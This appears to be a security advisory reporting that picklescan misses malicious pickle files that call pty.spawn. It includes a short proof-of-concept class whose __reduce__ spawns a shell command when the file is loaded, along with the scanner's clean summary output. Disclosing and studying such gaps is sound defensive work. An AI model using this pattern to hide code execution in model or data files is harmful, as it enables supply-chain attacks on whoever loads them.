  "summary": "Picklescan missing detection when calling pty.spawn",
  "details": "### Summary\nUsing pty.spawn, which is a built-in python library function to execute arbitrary commands on the host system.\n\n### Details\nThe attack payload executes in the following steps:\nFirst, the attacker craft the payload by calling to `pty.spawn` function in the `__reduce__` method. Then the victim attempts to use picklescan to scan the pickle file for issues and sees this -\n```\n----------- SCAN SUMMARY -----------\nScanned files: 1\nInfected files: 0\nDangerous globals: 0\n```\nThe victim proceeds to load the pickle file and execute attacker-injected arbitrary code.\n\n### PoC\n```\nclass PtyExploit:\n  def __reduce__(self):\n    return (pty.spawn, ([\"/bin/sh\", \"-c\", \"id; exit\"],))\n```\n\n### Impact\n**Who is impacted?** Any organization or individual relying on picklescan to detect malicious pickle files inside PyTorch models.\n**What is the impact?** Attackers can embed malicious code in pickle file that remains undetected but executes when the pickle file is loaded.\n**Supply Chain Attack**: Attackers can distribute infected pickle files across ML models, APIs, or saved Python objects.\n\n### Collaborators\nhttps://github.com/ajohnston9\nhttps://github.com/geo-lit",
